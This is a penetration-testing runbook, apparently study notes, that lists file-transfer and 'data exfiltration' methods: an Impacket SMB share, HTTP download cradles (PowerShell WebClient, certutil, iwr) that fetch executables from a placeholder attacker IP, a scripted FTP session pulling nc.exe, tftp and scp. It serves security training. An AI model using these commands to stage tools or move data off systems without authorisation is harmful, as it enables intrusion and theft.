# File Transfer Checklist

## Introduction

This runbook is to help with file transfering or data exfiltration. Transfering data to and from hosts is important.  This is a guide to walk through various methods.


## Table of Contents

- [File Transfer Checklist](#file-transfer-checklist)
  - [Introduction](#introduction)
  - [Table of Contents](#table-of-contents)
  - [SMB Server](#smb-server)
  - [HTTP](#http)
    - [Server](#server)
    - [Client](#client)
  - [Pure-FTPd](#pure-ftpd)
  - [tftp](#tftp)
  - [scp](#scp)

## SMB Server

```sh
# kali
impacket-smbserver share . -smb2support -user user -password test123
```
```cmd
# windows
net use z: \\<smbserver>\share /USER:user test123
copy z:\ .
```

## HTTP

### Server

```sh
python -m SimpleHTTPServer 8080
```

```sh
service apache2 start
```

### Client

Windows
``` cmd
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://<IP>/file.exe','C:\temp\file.exe')"
iwr -uri http://<IP>/file -Outfile c:\temp\file
wget http://<IP>/file -O file
curl http://<IP>/file -o file
certutil -urlcache -f http://<ip>:803/ok.exe ok.exe  
```

Linux
```sh
wget http://<ip>/file
curl http://<ip>/file > file
```

## Pure-FTPd

```sh
sudo groupadd ftpgroup
sudo useradd -g ftpgroup -d /dev/null -s /etc ftpuser
sudo pure-pw useradd offsec -u ftpuser -d /ftphome
sudo pure-pw mkdb
cd /etc/pure-ftpd/auth/
sudo ln -s ../conf/PureDB 60pdb
sudo mkdir -p /ftphome
sudo chown -R ftpuser:ftpgroup /ftphome/
sudo systemctl restart pure-ftpd
```

Transfer
```
echo open <IP> 21> ftp.txt
echo USER <user> >> ftp.txt
echo password>> ftp.txt
echo bin >> ftp.txt
echo GET nc.exe >> ftp.txt
echo bye >> ftp.txt
```
```
ftp -v -n -s:ftp.txt
```

## tftp


Config
```
sudo mkdir /tftp
sudo chown nobody: /tftp
sudo atftpd --daemon --port 69 /tftp
```
Transfer
```
tftp -i <IP> get file
```

## scp

Local File to a Remote System
```sh 
scp file <user>@192.168.0.20:/home/<directory>/
```
Remote File to a Local System
```sh 
scp <user>@192.168.0.20:/home/<directory>/ file
```

 <!--- Last Updated July 8, 2024 --->